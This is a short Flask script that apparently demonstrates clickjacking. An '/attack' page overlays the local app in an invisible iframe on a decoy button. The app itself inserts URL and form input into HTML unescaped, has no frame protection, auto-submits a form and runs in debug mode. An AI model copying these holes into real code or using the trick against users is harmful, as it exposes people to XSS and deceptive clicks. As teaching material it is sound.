from flask import Flask, request

app = Flask(__name__)

# Form (prefilled from URL)
@app.route('/')
def form():
    name = request.args.get("name", "")
    return f"""
    <form action="/submit" method="POST">
        <input name="name" value="{name}">
        <button>Submit</button>
    </form>

    <script>
        document.forms[0].submit();  // auto submit
    </script>
    """

# Submit page
@app.route('/submit', methods=['POST'])
def submit():
    return "Submitted: " + request.form['name']

# Clickjacking page
@app.route('/attack')
def attack():
    return """
    <h2>Click Me</h2>

    <!-- Hidden form page -->
    <iframe src="http://127.0.0.1:5000/?name=Hacked"
            style="opacity:0; position:absolute; top:0; left:0; width:200px; height:50px;">
    </iframe>

    <!-- Fake button -->
    <button style="width:200px; height:50px;">Click Me</button>
    """

app.run(debug=True)